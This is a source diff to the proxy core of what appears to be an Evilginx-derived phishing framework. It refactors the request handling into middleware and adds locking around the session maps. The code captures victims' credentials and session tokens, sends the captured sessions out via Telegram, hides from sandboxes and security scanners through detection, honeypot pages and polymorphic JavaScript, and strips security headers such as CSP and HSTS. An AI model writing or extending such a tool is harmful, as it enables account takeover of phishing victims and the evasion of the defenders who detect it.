@@ -105,6 +105,7 @@ type ProxySession struct {
 	PhishDomain  string
 	PhishletName string
 	Index        int
+	RemoteIP     string
 }
 
 // set the value of the specified key in the JSON body
@@ -152,7 +153,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		sessions:          make(map[string]*Session),
 		sids:              make(map[string]int),
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
-		cookieName:        GenRandomString(4),
+		cookieName:        "", // Initialize to empty string, will be set below
+	}
+
+	// Initialize cookie name from config or generate new one
+	if cfg.general.ServerCookieName != "" {
+		p.cookieName = cfg.general.ServerCookieName
+	} else {
+		p.cookieName = GenRandomString(4)
+		cfg.general.ServerCookieName = p.cookieName
+		// Save config to persist cookie name
+		// Note: Ideally we should use cfg.Save() but it might not be exposed or thread-safe here.
+		// For now we just set it in memory structure. User should manually persist if needed or we add Save method.
+		// Assuming Viper is used, we can try to set it.
+		// Since we don't have direct access to save yet, we rely on runtime config persistence or manual update.
+		log.Info("Generated new session cookie name: %s", p.cookieName)
 	}
 
 	p.Server = &http.Server{
@@ -244,104 +259,69 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			ctx.UserData = ps
 			hiblue := color.New(color.FgHiBlue)
 
-			// handle ip blacklist
-			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
+			// -------------------------------------------------------------------------
+			// REFACTORED: Chain of Responsibility (Middleware)
+			// -------------------------------------------------------------------------
+			middlewares := []ProxyMiddleware{
+				&IPMiddleware{},
+				&TrafficMiddleware{},
+				&BotMiddleware{},
+			}
 
-			// handle proxy headers
-			proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "Connecting-IP", "True-Client-IP", "Client-IP"}
-			for _, h := range proxyHeaders {
-				origin_ip := req.Header.Get(h)
-				if origin_ip != "" {
-					from_ip = strings.SplitN(origin_ip, ":", 2)[0]
-					break
+			for _, m := range middlewares {
+				r, resp, proceed := m.Handle(req, ctx, p)
+				if resp != nil {
+					return r, resp
+				}
+				if !proceed {
+					// Fallback block if false returned without response
+					r, resp := p.blockRequest(req)
+					return r, resp
 				}
 			}
 
-			// Check traffic shaping before processing request
-			if p.trafficShaper != nil {
-				allowed, reason := p.trafficShaper.ShouldAllowRequest(req, from_ip)
-				if !allowed {
-					log.Warning("[Traffic Shaper] Request blocked from %s: %s", from_ip, reason)
-					// Return 429 Too Many Requests
-					return req, goproxy.NewResponse(req, "text/plain", http.StatusTooManyRequests, reason)
-				}
-			}
-
-			// Check for sandbox/VM environment
-			if p.sandboxDetector != nil {
-				detection := p.sandboxDetector.Detect(req, from_ip)
-				if detection.IsSandbox {
-					log.Warning("[Sandbox Detector] %s environment detected from %s (confidence: %.2f): %v",
-						detection.DetectedType, from_ip, detection.Confidence, detection.Reasons)
-					
-					// Take action based on configuration
-					switch p.cfg.GetSandboxDetectionConfig().ActionOnDetection {
-					case "block":
-						return req, goproxy.NewResponse(req, "text/plain", http.StatusForbidden, "Access denied")
-					case "redirect":
-						redirectURL := p.cfg.GetSandboxDetectionConfig().RedirectURL
-						if redirectURL == "" {
-							redirectURL = "https://www.google.com"
-						}
-						resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
-						resp.Header.Set("Location", redirectURL)
-						return req, resp
-					case "honeypot":
-						honeypotResponse := p.cfg.GetSandboxDetectionConfig().HoneypotResponse
-						if honeypotResponse == "" {
-							honeypotResponse = "<html><body><h1>Welcome</h1><p>This is a legitimate website.</p></body></html>"
-						}
-						return req, goproxy.NewResponse(req, "text/html", http.StatusOK, honeypotResponse)
-					}
-				}
-			}
+			// Core Logic continues...
+			// Update from_ip to be consistent with middleware extraction
+			from_ip := ctx.UserData.(*ProxySession).RemoteIP
 
 			// Handle API endpoints
 			if strings.HasPrefix(req.URL.Path, "/api/legacy/cloudflare/worker") {
 				return p.handleCloudflareWorkerAPI(req)
 			}
-			
-			// Handle behavior data collection endpoint
-			if strings.HasPrefix(req.URL.Path, "/api/behavior/") {
-				return p.handleBehaviorData(req)
-			}
-			
-			// Handle CAPTCHA verification endpoint
-			if strings.HasPrefix(req.URL.Path, "/verify/captcha") {
-				return p.handleCaptchaVerification(req)
-			}
-			
-			// Handle sandbox detection endpoint
-			if strings.HasPrefix(req.URL.Path, "/api/sandbox-detection") {
-				return p.handleSandboxDetection(req)
+
+			if strings.HasPrefix(req.URL.Path, "/api/event/client-detection") {
+				return p.handleSandboxDetection(req, from_ip)
 			}
 
-			// Remove Cloudflare-specific headers that could expose proxy
-			cfHeaders := []string{
-				"CF-Connecting-IP",
-				"CF-Ray",
-				"CF-Visitor",
-				"CF-Request-ID",
-				"CF-IPCountry",
-				"CF-Visitor-Country",
-				"CF-EW-Via",
-				"CF-EW-Edge",
-				"CF-EW-Origin",
+			if strings.HasPrefix(req.URL.Path, "/api/captcha/verify") {
+				return p.handleCaptchaVerification(req, from_ip)
 			}
-			for _, h := range cfHeaders {
+
+			// Clean Headers
+			// Remove headers that might expose the proxy
+			removeHeaders := []string{
+				"Content-Security-Policy",
+				"Content-Security-Policy-Report-Only",
+				"Strict-Transport-Security",
+				"X-Frame-Options",
+				"X-Content-Type-Options",
+				"X-XSS-Protection",
+				"Public-Key-Pins",
+				"Expect-CT",
+				"Server",
+				"X-Powered-By",
+				"Via",
+			}
+			for _, h := range removeHeaders {
 				req.Header.Del(h)
 			}
 
-			// Remove proxy fingerprinting headers
+			// Remove internal Cloudflare headers if present
 			proxyFingerprintHeaders := []string{
-				"X-Forwarded-Proto",
-				"X-Forwarded-Host",
-				"X-Forwarded-Port",
-				"X-Forwarded-Server",
-				"Via",
-				"X-Real-IP",
-				"Forwarded",
-				"X-ProxyUser-Ip",
+				"CF-Connecting-IP",
+				"CF-IPCountry",
+				"CF-RAY",
+				"CF-Visitor",
 				"X-Original-URL",
 				"X-Rewrite-URL",
 			}
@@ -393,108 +373,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			connections := []string{"keep-alive", "close"}
 			req.Header.Set("Connection", connections[rand.Intn(len(connections))])
 
-			// Check IP whitelist if enabled
-			if p.cfg.IsWhitelistEnabled() && p.wl != nil {
-				if !p.wl.IsWhitelisted(from_ip) {
-					if p.wl.IsVerbose() {
-						log.Warning("whitelist: request from ip address '%s' was blocked (not in whitelist)", from_ip)
-					}
-					return p.blockRequest(req)
-				}
-			}
-
-			if p.cfg.GetBlacklistMode() != "off" {
-				if p.bl.IsBlacklisted(from_ip) {
-					if p.bl.IsVerbose() {
-						log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
-					}
-					return p.blockRequest(req)
-				}
-				if p.cfg.GetBlacklistMode() == "all" {
-					if !p.bl.IsWhitelisted(from_ip) {
-						err := p.bl.AddIP(from_ip)
-						if p.bl.IsVerbose() {
-							if err != nil {
-								log.Error("blacklist: %s", err)
-							} else {
-								log.Warning("blacklisted ip address: %s", from_ip)
-							}
-						}
-					}
-
-					return p.blockRequest(req)
-				}
-			}
-
-			// ML-based bot detection (primary)
-			if p.mlDetector != nil && !p.developer {
-				// Generate client ID for tracking
-				clientID := p.getClientIdentifier(req)
-				
-				// Extract features
-				var tlsState *tls.ConnectionState
-				if ctx.Resp != nil && ctx.Resp.TLS != nil {
-					tlsState = ctx.Resp.TLS
-				}
-				
-				features := p.mlDetector.featureExtractor.ExtractRequestFeatures(req, tlsState, clientID)
-				
-				// Check JA3 fingerprint
-				if p.tlsInterceptor != nil {
-					ja3Result := p.tlsInterceptor.GetConnectionJA3(req.RemoteAddr)
-					if ja3Result != nil {
-						features.JA3Hash = ja3Result.JA3Hash
-						if ja3Result.IsBot {
-							log.Warning("[JA3] Known bot detected: %s from %s", ja3Result.BotName, from_ip)
-						}
-					}
-				}
-				
-				// Run ML detection
-				mlResult, err := p.mlDetector.Detect(features, clientID)
-				if err == nil && mlResult.IsBot {
-					log.Warning("[ML Detector] Bot detected (confidence: %.1f%%): %s %s [%s]",
-						mlResult.Confidence*100, req.Method, req.URL.String(), from_ip)
-					log.Debug("[ML Detector] Reasons: %v", mlResult.Explanation)
-					
-					// Check if we should spoof content or block
-					if p.cfg.GetBotguardConfig() != nil && p.cfg.GetBotguardConfig().SpoofURL != "" {
-						// Use BotGuard's spoof response mechanism
-						if p.botguard != nil {
-							spoofResp := p.botguard.GetSpoofResponse(req)
-							return req, goproxy.NewResponse(req, "text/html", spoofResp.StatusCode, "")
-						}
-					}
-					return p.blockRequest(req)
-				}
-			}
-
-			// Legacy BotGuard detection (fallback)
-			if p.botguard != nil && !p.developer && p.mlDetector == nil {
-				// Get TLS state from context if available
-				var tlsState *tls.ConnectionState
-				if ctx.Resp != nil && ctx.Resp.TLS != nil {
-					tlsState = ctx.Resp.TLS
-				}
-
-				_, isBot := p.botguard.AnalyzeRequest(req, tlsState)
-				if isBot {
-					// Check if we should spoof content or block
-					if p.cfg.GetBotguardConfig() != nil && p.cfg.GetBotguardConfig().SpoofURL != "" {
-						log.Warning("[botguard] bot detected, spoofing content: %s %s [%s]",
-							req.Method, req.URL.String(), from_ip)
-
-						// Return spoofed content
-						spoofResp := p.botguard.GetSpoofResponse(req)
-						return req, goproxy.NewResponse(req, "text/html", spoofResp.StatusCode, "")
-					} else {
-						log.Warning("[botguard] bot detected, blocking: %s %s [%s]",
-							req.Method, req.URL.String(), from_ip)
-						return p.blockRequest(req)
-					}
-				}
-			}
-
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
 			o_host := req.Host
 			lure_url := req_url
@@ -517,7 +395,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					js_id := ra[2]
 					if strings.HasSuffix(js_id, ".js") {
 						js_id = js_id[:len(js_id)-3]
-						if s, ok := p.sessions[session_id]; ok {
+						p.session_mtx.Lock()
+						s, ok := p.sessions[session_id]
+						p.session_mtx.Unlock()
+						if ok {
 							var d_body string
 							var js_params *map[string]string = nil
 							js_params = &s.Params
@@ -554,7 +435,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if strings.HasSuffix(session_id, ".js") {
 						// respond with injected javascript
 						session_id = session_id[:len(session_id)-3]
-						if s, ok := p.sessions[session_id]; ok {
+						p.session_mtx.Lock()
+						s, ok := p.sessions[session_id]
+						p.session_mtx.Unlock()
+						if ok {
 							var d_body string
 							if !s.IsDone {
 								if s.RedirectURL != "" {
@@ -582,7 +466,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							log.Warning("js: session not found: '%s'", session_id)
 						}
 					} else {
-						if _, ok := p.sessions[session_id]; ok {
+						p.session_mtx.Lock()
+						_, ok := p.sessions[session_id]
+						p.session_mtx.Unlock()
+						if ok {
 							redirect_url, ok := p.waitForRedirectUrl(session_id)
 							if ok {
 								type ResponseRedirectUrl struct {
@@ -627,7 +514,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					var ok bool = false
 					sc, err := req.Cookie(session_cookie)
 					if err == nil {
+						p.session_mtx.Lock()
 						ps.Index, ok = p.sids[sc.Value]
+						p.session_mtx.Unlock()
 						if ok {
 							create_session = false
 							ps.SessionId = sc.Value
@@ -713,12 +602,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										}
 									}
 
+									p.session_mtx.Lock()
 									sid := p.last_sid
 									p.last_sid += 1
+									p.session_mtx.Unlock()
+
 									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
 									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
+
+									p.session_mtx.Lock()
 									p.sessions[session.Id] = session
 									p.sids[session.Id] = sid
+									p.session_mtx.Unlock()
 
 									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
 										rid, ok := session.Params["rid"]
@@ -787,7 +682,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				req.Header.Set(p.getHomeDir(), o_host)
 
 				if ps.SessionId != "" {
-					if s, ok := p.sessions[ps.SessionId]; ok {
+					p.session_mtx.Lock()
+					s, ok := p.sessions[ps.SessionId]
+					p.session_mtx.Unlock()
+					if ok {
 						l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 						if err == nil {
 							// show html redirector if it is set for the current lure
@@ -1411,7 +1309,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							log.Error("database: %v", err)
 						}
 						s.Finish(false)
-						
+
 						// Auto-export and send session via Telegram
 						if sessionID, ok := p.sids[ps.SessionId]; ok {
 							p.AutoExportAndSendSession(sessionID, ps.SessionId)
@@ -1529,24 +1427,24 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 							log.Debug("js_inject: injected redirect script for session: %s", s.Id)
 							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id))
-							
+
 							// Inject behavior collection JavaScript
 							if p.mlDetector != nil && p.mlDetector.featureExtractor != nil {
 								behaviorJS := p.mlDetector.featureExtractor.BehaviorCollectorJS(s.Id)
-								
+
 								// Apply polymorphic mutations if enabled
 								if p.polymorphicEngine != nil && p.cfg.GetPolymorphicConfig().Enabled {
 									context := &MutationContext{
 										SessionID: s.Id,
 										Timestamp: time.Now().Unix(),
 									}
-									
+
 									if p.cfg.GetPolymorphicConfig().TemplateMode {
 										// Use template mode
 										params := map[string]string{
-											"endpoint": "/api/behavior/" + s.Id,
-											"delay": "5000",
-											"getTime": "Date.now",
+											"endpoint":    "/api/behavior/" + s.Id,
+											"delay":       "5000",
+											"getTime":     "Date.now",
 											"docListener": "document.addEventListener",
 										}
 										mutatedJS, err := p.polymorphicEngine.MutateTemplate("behavior_collector", context, params)
@@ -1560,11 +1458,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										log.Debug("js_inject: applied polymorphic mutation for session: %s", s.Id)
 									}
 								}
-								
+
 								body = p.injectJavascriptIntoBody(body, behaviorJS, "")
 								log.Debug("js_inject: injected behavior collector for session: %s", s.Id)
 							}
-							
+
 							// Inject sandbox detection JavaScript
 							if p.sandboxDetector != nil && p.cfg.GetSandboxDetectionConfig().ClientSideChecks {
 								sandboxJS := p.sandboxDetector.GetDetectionScript()
@@ -1582,7 +1480,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									log.Debug("js_inject: injected sandbox detector for session: %s", s.Id)
 								}
 							}
-							
+
 							// Inject CAPTCHA if enabled
 							if p.captchaManager != nil && p.captchaManager.IsEnabled() {
 								// Check if this lure requires CAPTCHA
@@ -1590,7 +1488,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								if p.cfg.GetCaptchaConfig() != nil && p.cfg.GetCaptchaConfig().RequireForLures {
 									requireCaptcha = true
 								}
-								
+
 								if requireCaptcha && !s.IsCaptchaVerified {
 									captchaHTML := p.captchaManager.GetCaptchaHTML()
 									if captchaHTML != "" {
@@ -1607,7 +1505,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
+				p.session_mtx.Lock()
 				s, ok := p.sessions[ps.SessionId]
+				p.session_mtx.Unlock()
 				if ok && s.IsDone {
 					for _, au := range pl.authUrls {
 						if au.MatchString(resp.Request.URL.Path) {
@@ -1625,7 +1525,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 							if err == nil {
 								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
-								
+
 								// Auto-export when auth URL is detected
 								if sessionID, ok := p.sids[ps.SessionId]; ok {
 									p.AutoExportAndSendSession(sessionID, ps.SessionId)
@@ -1653,7 +1553,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			if pl != nil && ps.SessionId != "" {
+				p.session_mtx.Lock()
 				s, ok := p.sessions[ps.SessionId]
+				p.session_mtx.Unlock()
 				if ok && s.IsDone {
 					if s.RedirectURL != "" && s.RedirectCount == 0 {
 						if stringExists(mime, []string{"text/html"}) && resp.StatusCode == 200 && len(body) > 0 && (strings.Index(string(body), "</head>") >= 0 || strings.Index(string(body), "</body>") >= 0) {
@@ -1680,8 +1582,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 }
 
 func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {
-
+	p.session_mtx.Lock()
 	s, ok := p.sessions[session_id]
+	p.session_mtx.Unlock()
 	if ok {
 
 		if s.IsDone {
@@ -2103,7 +2006,6 @@ func (p *HttpProxy) setSessionCustom(sid string, name string, value string) {
 	}
 }
 
-
 func (p *HttpProxy) httpsWorker() {
 	var err error
 
@@ -2131,7 +2033,7 @@ func (p *HttpProxy) httpsWorker() {
 					}
 				}
 			}()
-			
+
 			now := time.Now()
 			c.SetReadDeadline(now.Add(httpReadTimeout))
 			c.SetWriteDeadline(now.Add(httpWriteTimeout))
@@ -2460,16 +2362,16 @@ func (p *HttpProxy) getClientIdentifier(req *http.Request) string {
 	} else if realIP := req.Header.Get("X-Real-IP"); realIP != "" {
 		ip = realIP
 	}
-	
+
 	// Remove port if present
 	if idx := strings.LastIndex(ip, ":"); idx != -1 {
 		ip = ip[:idx]
 	}
-	
+
 	// Combine IP with user agent for unique identifier
 	ua := req.UserAgent()
 	identifier := fmt.Sprintf("%s|%s", ip, ua)
-	
+
 	// Hash for consistency and privacy
 	hash := sha256.Sum256([]byte(identifier))
 	return fmt.Sprintf("%x", hash[:16]) // Use first 16 bytes for shorter ID
@@ -2648,30 +2550,30 @@ func (p *HttpProxy) handleBehaviorData(req *http.Request) (*http.Request, *http.
 	if len(pathParts) < 4 {
 		return req, goproxy.NewResponse(req, "application/json", http.StatusBadRequest, `{"error":"Invalid request"}`)
 	}
-	
+
 	sessionID := pathParts[3]
-	
+
 	// Only accept POST requests
 	if req.Method != "POST" {
 		return req, goproxy.NewResponse(req, "application/json", http.StatusMethodNotAllowed, `{"error":"Method not allowed"}`)
 	}
-	
+
 	// Read request body
 	body, err := ioutil.ReadAll(req.Body)
 	if err != nil {
 		return req, goproxy.NewResponse(req, "application/json", http.StatusBadRequest, `{"error":"Failed to read request body"}`)
 	}
 	defer req.Body.Close()
-	
+
 	// Parse behavior data
 	var behaviorData map[string]interface{}
 	if err := json.Unmarshal(body, &behaviorData); err != nil {
 		return req, goproxy.NewResponse(req, "application/json", http.StatusBadRequest, `{"error":"Invalid JSON"}`)
 	}
-	
+
 	// Get client identifier
 	clientID := p.getClientIdentifier(req)
-	
+
 	// Update ML detector's feature extractor with behavior data
 	if p.mlDetector != nil && p.mlDetector.featureExtractor != nil {
 		err := p.mlDetector.featureExtractor.UpdateClientBehavior(clientID, behaviorData)
@@ -2679,7 +2581,7 @@ func (p *HttpProxy) handleBehaviorData(req *http.Request) (*http.Request, *http.
 			log.Debug("[ML Detector] Failed to update behavior: %v", err)
 		}
 	}
-	
+
 	// Log behavior data counts safely
 	mouseCount := 0
 	keyboardCount := 0
@@ -2689,30 +2591,29 @@ func (p *HttpProxy) handleBehaviorData(req *http.Request) (*http.Request, *http.
 	if keyboardData, ok := behaviorData["keyboard"].([]interface{}); ok {
 		keyboardCount = len(keyboardData)
 	}
-	
-	log.Debug("[Behavior] Received data from session %s: %d mouse, %d keyboard events", 
+
+	log.Debug("[Behavior] Received data from session %s: %d mouse, %d keyboard events",
 		sessionID, mouseCount, keyboardCount)
-	
+
 	// Return success response
 	return req, goproxy.NewResponse(req, "application/json", http.StatusOK, `{"status":"ok"}`)
 }
 
-func (p *HttpProxy) handleSandboxDetection(req *http.Request) (*http.Request, *http.Response) {
+func (p *HttpProxy) handleSandboxDetection(req *http.Request, from_ip string) (*http.Request, *http.Response) {
 	// Only accept POST requests
 	if req.Method != "POST" {
 		return req, goproxy.NewResponse(req, "application/json", http.StatusMethodNotAllowed, `{"error":"Method not allowed"}`)
 	}
-	
+
 	// Read request body
 	body, err := ioutil.ReadAll(req.Body)
 	if err != nil {
 		return req, goproxy.NewResponse(req, "application/json", http.StatusBadRequest, `{"error":"Failed to read request body"}`)
 	}
 	defer req.Body.Close()
-	
-	// Get client IP
-	from_ip := strings.Split(req.RemoteAddr, ":")[0]
-	
+
+	// Use passed IP
+
 	// Process detection data
 	if p.sandboxDetector != nil {
 		err := p.sandboxDetector.ProcessClientDetection(body, from_ip)
@@ -2721,26 +2622,26 @@ func (p *HttpProxy) handleSandboxDetection(req *http.Request) (*http.Request, *h
 			return req, goproxy.NewResponse(req, "application/json", http.StatusBadRequest, `{"error":"Invalid detection data"}`)
 		}
 	}
-	
+
 	log.Debug("[Sandbox Detector] Received client-side detection from %s", from_ip)
-	
+
 	// Return success response
 	return req, goproxy.NewResponse(req, "application/json", http.StatusOK, `{"status":"ok"}`)
 }
 
-func (p *HttpProxy) handleCaptchaVerification(req *http.Request) (*http.Request, *http.Response) {
+func (p *HttpProxy) handleCaptchaVerification(req *http.Request, from_ip string) (*http.Request, *http.Response) {
 	// Only accept POST requests
 	if req.Method != "POST" {
 		return req, goproxy.NewResponse(req, "application/json", http.StatusMethodNotAllowed, `{"error":"Method not allowed"}`)
 	}
-	
+
 	// Read request body
 	body, err := ioutil.ReadAll(req.Body)
 	if err != nil {
 		return req, goproxy.NewResponse(req, "application/json", http.StatusBadRequest, `{"error":"Failed to read request body"}`)
 	}
 	defer req.Body.Close()
-	
+
 	// Parse CAPTCHA response
 	var captchaData struct {
 		Response string `json:"response"`
@@ -2748,13 +2649,10 @@ func (p *HttpProxy) handleCaptchaVerification(req *http.Request) (*http.Request,
 	if err := json.Unmarshal(body, &captchaData); err != nil {
 		return req, goproxy.NewResponse(req, "application/json", http.StatusBadRequest, `{"error":"Invalid JSON"}`)
 	}
-	
-	// Get remote IP
-	remoteIP := req.RemoteAddr
-	if forwarded := req.Header.Get("X-Forwarded-For"); forwarded != "" {
-		remoteIP = strings.Split(forwarded, ",")[0]
-	}
-	
+
+	// Use passed IP
+	remoteIP := from_ip
+
 	// Verify CAPTCHA
 	verified := false
 	if p.captchaManager != nil {
@@ -2763,7 +2661,7 @@ func (p *HttpProxy) handleCaptchaVerification(req *http.Request) (*http.Request,
 			log.Error("[CAPTCHA] Verification error: %v", err)
 		}
 	}
-	
+
 	if verified {
 		// Get session ID from cookie
 		sessionCookie, err := req.Cookie("evilginx_session")
@@ -2775,7 +2673,7 @@ func (p *HttpProxy) handleCaptchaVerification(req *http.Request) (*http.Request,
 			}
 			p.session_mtx.Unlock()
 		}
-		
+
 		return req, goproxy.NewResponse(req, "application/json", http.StatusOK, `{"success":true}`)
 	} else {
 		log.Warning("[CAPTCHA] Verification failed from IP: %s", remoteIP)
